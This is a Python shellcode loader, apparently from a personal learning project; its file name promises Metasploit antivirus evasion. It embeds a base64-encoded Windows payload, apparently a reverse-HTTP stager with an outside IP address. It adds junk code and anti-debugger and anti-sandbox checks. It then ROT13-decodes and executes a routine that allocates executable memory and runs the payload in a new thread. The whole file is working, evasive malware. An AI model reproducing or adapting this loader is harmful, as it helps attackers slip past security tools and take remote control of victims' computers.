# -*- coding: utf-8 -*-
# @Time    : 18 2月 2025 12:57下午
# @Author  : codervibe
# @File    : msf免杀加密混淆彻底解决shellcode .py
# @Project : pythonBasics

import ctypes
import base64
import os, psutil
# 垃圾代码块
for _ in range(ord('@')):
    if (lambda x: x ** 2)(_) % 3 == 0:
        _ = str(_) * int(bin(0o777)[2:])


def _0xr0t13(_0xmsg):
    _0xresult = []
    for _0xchar in _0xmsg:
        _0xordval = ord(_0xchar)
        if (0x41 <= _0xordval <= 0x4D) or (0x61 <= _0xordval <= 0x6D):
            _0xresult.append(chr(_0xordval + 0xD))
        elif (0x4E <= _0xordval <= 0x5A) or (0x6E <= _0xordval <= 0x7A):
            _0xresult.append(chr(_0xordval - 0xD))
        else:
            _0xresult.append(_0xchar)
    return ''.join(_0xresult)

_0xdeadc0de = '/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuIkTAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L29HUFcAgFg7cwYv7PisEs0eNRcaev3oFJVvQO8NhMs7nri7Qun0LsyM/ff4V8s+vctGuoowiTbF6ppACZ2fBWsSZuXJhOjsODxfgj+0EABVc2VyLUFnZW50OiBNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA4LjA7IFdpbmRvd3MgTlQgNS4xOyBUcmlkZW50LzQuMDsgU1YxKQ0KAJhCBjKnIWJgnyMzTY72LfKIBhYM0vEov4BGiVSrVbxWBQkLVqTZQM7dPnfOTJhoBXSiccpwZ19h6IrkfX/NhaQpfdmQnsQG8ZE176/vuJdVrPhQRsHVdYnGEdGOecLN2tkjLWQ5lqXYPomlM5Z2WXYuq4QQjde8qkIu9Aqa+RXMDU/Pro516UpVdRGijX8JcTB5w7wyaFnP5opeH/hU9ymgUiXaZCbzsp5a5rExUU44Vrly1BBWWktFGBEflAviHQEnxWJUoQpoEIaCX0HKD8LfHaYe8lpa5JOM4qcAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjE2Mi4xMjEuMTQ3ABI0Vng='
s = base64.b64decode(_0xdeadc0de)
# 反调试检测函数
def _0xantidebug_check():
    import sys, ctypes.wintypes

    # 检测调试器
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
    if kernel32.IsDebuggerPresent():
        sys.exit(0)

    # 检测远程调试
    check_debug = ctypes.wintypes.BOOL()
    kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(check_debug))
    if check_debug.value:
        sys.exit(0)

# 反沙箱检测函数
def _0xantisandbox_check():


    # 检测内存大小（沙箱通常内存较小）
    if psutil.virtual_memory().total < 2 * 1024**3:  # 小于2GB
        os._exit(0)

    # 检测CPU核心数（沙箱通常核心较少）
    if psutil.cpu_count() <= 2:
        os._exit(0)

    # 检测常见沙箱进程
    sandbox_processes = {
        "vmtoolsd", "vmwaretray", "vboxservice",
        "procmon", "wireshark", "python"
    }
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in sandbox_processes:
            os._exit(0)

# 在关键位置插入检测（在shellcode执行前）
_0xantidebug_check()
_0xantisandbox_check()


_0xc0d3d = "pglcrf.jvaqyy.xreary32.IveghnyNyybp.erfglcr=pglcrf.p_hvag64;ejkcntr = pglcrf.jvaqyy.xreary32.IveghnyNyybp(0, yra(f), 0k1000, 0k40);pglcrf.jvaqyy.xreary32.EgyZbirZrzbel(pglcrf.p_hvag64(ejkcntr), pglcrf.perngr_fgevat_ohssre(f), yra(f));unaqyr = pglcrf.jvaqyy.xreary32.PerngrGuernq(0, 0, pglcrf.p_hvag64(ejkcntr), 0, 0, 0);pglcrf.jvaqyy.xreary32.JnvgSbeFvatyrBowrpg(unaqyr, -1)"

exec(_0xr0t13(_0xc0d3d))
